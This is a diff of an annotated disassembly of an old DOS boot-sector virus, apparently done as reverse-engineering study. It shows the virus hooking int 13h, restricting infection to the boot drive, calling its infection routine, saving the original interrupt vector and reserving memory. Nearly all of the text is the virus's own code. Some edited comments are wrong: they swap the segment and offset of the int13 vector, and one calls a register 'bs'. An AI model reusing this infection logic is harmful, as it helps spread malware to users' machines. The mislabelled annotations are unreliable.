@@ -39,7 +39,7 @@ seg000:7C0E    ; ---------------------------------------------------------------
 seg000:7C0E    push ds                                                                       | push ds onto stack
 seg000:7C0F    push ax                                                                       | push ax onto stack
 seg000:7C10    or dl, dl                                                                     | dl OR dl
-seg000:7C12    jnz short loc_7C2F                                                            | jump if dl != 0: dl tells us what drive the caller is targeting
+seg000:7C12    jnz short loc_7C2F                                                            | jump if dl != 0: dl tells us what drive the caller is targeting; dont't infect anything but boot drive
 seg000:7C14    xor ax, ax                                                                    | clear ax
 seg000:7C16    mov ds, ax                                                                    | clear ds
 seg000:7C18    test byte ptr ds:43Fh, 1                                                      | check if any drive motor running
@@ -47,24 +47,24 @@ seg000:7C1D    jnz short loc_7C2F                                               
 seg000:7C1F    pop ax                                                                        | pop ax
 seg000:7C20    pop ds                                                                        | pop ds
 seg000:7C21    pushf                                                                         | push EFLAGS onto stack
-seg000:7C22    call dword ptr cs:0Ah                                                         | go back to checking drive motor
-seg000:7C27    pushf                                                                         | 
-seg000:7C28    call sub_7C36                                                                 | 
+seg000:7C22    call dword ptr cs:0Ah                                                         | do real int13
+seg000:7C27    pushf                                                                         | push EFLAGS onto stack
+seg000:7C28    call sub_7C36                                                                 | call infection routine
 seg000:7C2B    popf                                                                          | 
 seg000:7C2C    retf 2                                                                        | 
-seg000:7C2F    ; --------------------------------------------------------------------------- | kinda seems like an infinite loop, but IT AINT
+seg000:7C2F    ; --------------------------------------------------------------------------- | 
 seg000:7C2F                                                                                  | 
 seg000:7C2F    loc_7C2F: ; CODE XREF: seg000:7C12j                                           | 
 seg000:7C2F    ; seg000:7C1Dj                                                                | 
 seg000:7C2F    pop ax                                                                        | pop ax
 seg000:7C30    pop ds                                                                        | pop ds
-seg000:7C31    jmp dword ptr cs:0Ah                                                          | jmp back to checking drive motor
+seg000:7C31    jmp dword ptr cs:0Ah                                                          | jmp to real int13 handler
 seg000:7C36                                                                                  | 
 seg000:7C36    ; =============== S U B R O U T I N E ======================================= | 
 seg000:7C36                                                                                  | 
 seg000:7C36                                                                                  | 
-seg000:7C36    sub_7C36 proc near ; CODE XREF: seg000:7C28p                                  | 
-seg000:7C36    push ax                                                                       | 
+seg000:7C36    sub_7C36 proc near ; CODE XREF: seg000:7C28p                                  | start of infection routine
+seg000:7C36    push ax                                                                       | saving registers
 seg000:7C37    push bx                                                                       | 
 seg000:7C38    push cx                                                                       | 
 seg000:7C39    push dx                                                                       | 
@@ -73,17 +73,17 @@ seg000:7C3B    push es                                                          
 seg000:7C3C    push si                                                                       | 
 seg000:7C3D    push di                                                                       | 
 seg000:7C3E    push cs                                                                       | 
-seg000:7C3F    pop ds                                                                        | 
-seg000:7C40    push cs                                                                       | 
-seg000:7C41    pop es                                                                        | 
-seg000:7C42    mov si, 4                                                                     | 
+seg000:7C3F    pop ds                                                                        | put code segment value into ds
+seg000:7C40    push cs                                                                       | store cs again
+seg000:7C41    pop es                                                                        | put code segment value into es
+seg000:7C42    mov si, 4                                                                     | store 4 in si
 seg000:7C45                                                                                  | 
 seg000:7C45    loc_7C45: ; CODE XREF: sub_7C36+29j                                           | 
-seg000:7C45    mov ax, 201h                                                                  | 
-seg000:7C48    mov bx, 200h                                                                  | 
-seg000:7C4B    mov cx, 1                                                                     | 
-seg000:7C4E    xor dx, dx                                                                    | 
-seg000:7C50    pushf                                                                         | 
+seg000:7C45    mov ax, 201h                                                                  | ax = 201h
+seg000:7C48    mov bx, 200h                                                                  | bs = 200h
+seg000:7C4B    mov cx, 1                                                                     | cx = 1
+seg000:7C4E    xor dx, dx                                                                    | dx = 0
+seg000:7C50    pushf                                                                         | push EFLAGS
 seg000:7C51    call dword ptr ds:0Ah                                                         | 
 seg000:7C55    jnb short loc_7C63                                                            | 
 seg000:7C57    xor ax, ax                                                                    | 
@@ -154,10 +154,10 @@ seg000:7CB9    mov sp, ax                                                       
 seg000:7CBB    sti                                                                           | enable interrupts
 seg000:7CBC    push ds                                                                       | push data segment (0) onto stack
 seg000:7CBD    push ax                                                                       | push ax (7C00h) onto stack
-seg000:7CBE    mov ax, ds:4Ch                                                                | store byte 1 actual int13 handler pointer in ax
-seg000:7CC1    mov ds:word_7C0A, ax                                                          | save byte 1 actual int13 handler pointer at word_7C0A
-seg000:7CC4    mov ax, ds:4Eh                                                                | store byte 2 actual int13 handler pointer in ax
-seg000:7CC7    mov ds:word_7C0C, ax                                                          | save byte 2 actual int13 handler pointer at word_7C0C
+seg000:7CBE    mov ax, ds:4Ch                                                                | store segment of actual int13 handler pointer in ax
+seg000:7CC1    mov ds:word_7C0A, ax                                                          | save segment of actual int13 handler pointer at word_7C0A
+seg000:7CC4    mov ax, ds:4Eh                                                                | store offset of actual int13 handler pointer in ax
+seg000:7CC7    mov ds:word_7C0C, ax                                                          | save offset of actual int13 handler pointer at word_7C0C
 seg000:7CCA    mov ax, ds:413h                                                               | store current memory size in ax
 seg000:7CCD    dec ax                                                                        | decrement memory size by 2k
 seg000:7CCE    dec ax                                                                        |  .continuation 
